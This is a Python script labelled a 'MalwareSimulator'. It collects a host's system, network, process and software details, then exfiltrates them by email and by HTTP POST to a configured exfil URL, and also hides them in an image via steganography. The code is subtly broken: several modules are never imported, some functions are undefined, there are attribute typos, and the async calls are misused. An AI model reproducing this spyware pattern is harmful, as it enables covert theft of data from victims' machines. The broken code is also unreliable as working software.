#!/usr/bin/env python3
import os
import sys
import re
import uuid
import time
import socket
import psutil
import smtplib
import requests
import datetime
import getpass
import netifaces
import sqlite3
import platform
import subprocess
import configparser
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from concurrent.futures import ThreadPoolExecutor

class MalwareSimulator:
    def __init__(self, config_path: str):
        self.config = configparser.ConfigParser()
        self.config.read(config_path)
        
        self.target_email = self.config['MAIL'].get('target_email')
        self.attacker_email = self.config['MAIL'].get('attacker_email')
        self.smtp_server = self.config['MAIL'].get('smtp_server')
        self.image_path = self.config['STEGANO'].get('input_image')
        
        self.collected_data = {}
        
    def collect_system_info(self):
        info = {}
        try:
            info['hostname'] = socket.gethostname()
            info['username'] = getpass.getuser()
            info['mac_address'] = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
            info['boot_time'] = datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
            info['cpu'] = {
                'physical_cores': psutil.cpu_count(logical=False),
                'logical_cores': psutil.cpu_count(logical=True),
                'freq': psutil.cpu_freq().current if psutil.cpu_freq() else 0,
                'usage': psutil.cpu_percent(interval=1)
            }
            info['ram'] = {
                'total': psutil.virtual_memory().total,
                'available': psutil.virtual_memory().available,
                'used': psutil.virtual_memory().used,
                'percent': psutil.virtual_memory().percent
            }
            
            disks = psutil.disk_partitions(all=False)
            disk_usage = {}
            for disk in disks:
                usage = psutil.disk_usage(disk.mountpoint)
                disk_usage[disk.device] = {
                    'mount_point': disk.mountpoint,
                    'fstype': disk.fstype,
                    'total': usage.total,
                    'free': usage.free,
                    'used': usage.used,
                    'percent': usage.percent
                }
            info['disks'] = disk_usage
            
            return info
        except Exception as e:
            print(f"[ERROR] Collecting system info: {str(e)}")
            
    def collect_network_info(self):
        info = {}
        try:
            interfaces = netifaces.interfaces()
            iface_info = {}
            
            for iface in interfaces:
                iface_addrs = netifaces.ifaddresses(iface)
                if netifaces.AF_LINK in iface_addrs:
                    iface_info[iface] = {}
                    iface_info[iface]['hwaddr'] = iface_addrs[netifaces.AF_LINK][0]['addr']
                    
                    if netifaces.AF_INET in iface_addrs:
                        iface_info[iface]['ipv4'] = iface_addrs[netifaces.AF_INET]
                        
                    if netifaces.AF_INET6 in iface_addrs:
                        iface_info[iface]['ipv6'] = iface_addrs[netifaces.AF_INET6]
            
            info['interfaces'] = iface_info
            
            # Public IP detection
            try:
                public_ip = requests.get('https://api.ipify.org?format=json', timeout=5).text
                info['public_ip'] = public_ip
            except:
                info['public_ip'] = 'N/A'
                
            return info
        except Exception as e:
            print(f"[ERROR] Collecting network info: {str(e)}")
            
    def collect_process_info(self):
        try:
            procs = []
            for proc in psutil.process_iter(['pid', 'name', 'username']):
                try:
                    procs.append({
                        'pid': proc.info['pid'],
                        'name': proc.info['name'],
                        'user': proc.info['username']
                    })
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
                    
            return {'processes': procs}
        except Exception as e:
            print(f"[ERROR] Collecting process info: {str(e)}")
            
    def collect_installed_software(self):
        try:
            if platform.system() == 'Windows':
                # Windows registry parsing
                software = []
                reg_query = subprocess.run(
                    'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall',
                    shell=True, capture_output=True, text=True
                )
                return {'software': software}
            else:
                # Linux package listing
                software = []
                dpkg_output = subprocess.run(
                    'dpkg-query -W', shell=True, capture_output=True, text=True
                )
                return {'software': software}
        except Exception as e:
            print(f"[ERROR] Collecting software inventory: {str(e)}")
            
    async def exfiltrate_data(self):
        try:
            session = aiohttp.ClientSession()
            
            # Package collected data
            report_data = {
                'report_id': str(uuid.uuid4()),
                'timestamp': datetime.datetime.utcnow().isoformat(),
                'system_info': self.system_info,
                'network_info': self.network_info,
                'process_info': self.process_info,
                'software_inventory': self.software_inventory
            }
            
            # Send via email
            await self.send_report_via_mail(report_data, session)
            
            # Send via HTTP
            await self.send_report_via_http(report_data, session)
            
            await session.close()
        except Exception as e:
            print(f"[ERROR] Exfiltration failed: {str(e)}")
            
    async def send_report_via_mail(self, data, session):
        try:
            smtp_server = self.config['MAIL'].get('smtp_host')
            smtp_port = self.config['MAIL'].getint('smtp_port')
            
            msg = MIMEMultipart()
            msg['From'] = self.attackers_email
            msg['To'] = self.target_email
            msg['Subject'] = f"System Report - {data['report_id']}"
            
            msg.attach(MIMEText(json.dumps(data, indent=2), 'plain'))
            
            await self.async_send_email(msg, session)
        except Exception as e:
            print(f"[ERROR] Mail exfiltration failed: {str(e)}")
            
    async def send_report_via_http(self, data, session):
        try:
            http_endpoint = self.config['HTTP'].get('exfil_url')
            
            async with session.post(
                http_endpoint,
                headers={'Content-Type': 'application/json'},
                data=json.dumps(data)
            ) as resp:
                if resp.status != 200:
                    print(f"HTTP upload failed with status: {resp.status}")
        except Exception as e:
            print(f"[ERROR] HTTP exfiltration failed: {str(e)}")
            
    def hide_data_in_image(self):
        try:
            # Load the original image
            original = Image.open(self.image_path)
            
            # Create data container
            data_container = []
            
            # Store extracted data
            data_container.append({
                'timestamp': datetime.datetime.utcnow().isoformat(),
                'system_id': str(uuid.uuid4()),
                'collector': 'simulated_malware'
            })
            
            # Package collected data
            data_container.append({
                'system_info': self.system_info,
                'network_info': self.network_info,
                'process_info': self.process_info,
                'software_inventory': self.software_inventory,
                'collected_timestamp': datetime.datetime.utcnow().isoformat()
            })
            
            # Create output image with hidden data
            output_path = '/tmp/stego_simulated.png'
            create_stegano(original, data_container, output_path)
            
            return output_path
        except Exception as e:
            print(f"[ERROR] Steganography embedding failed: {str(e)}")
            return None
            
    def main(self):
        try:
            # Collect all data
            self.system_info = self.collect_system_info()
            self.network_info = self.collect_network_info()
            self.process_info = self.collect_process_info()
            self.software_inventory = self.collect_installed_software()
            
            # Create output image with hidden data
            stego_image = self.hide_data_in_image()
            
            # Schedule data exfiltration
            asyncio.run(self.exfiltrate_data())
            
            return stego_image
            
        except Exception as e:
            print(f"[CRITICAL ERROR] Collection failed: {str(e)}")
            return None

async def main_async():
    malware = MalwareSimulator('config.ini')
    stego_image = await malware.main()
    
    if stego_image:
        print(f"\n[{datetime.datetime.now()}] Stolen data embedded in: {stego_image}")

if __name__ == "__main__":
    asyncio.run(main_async())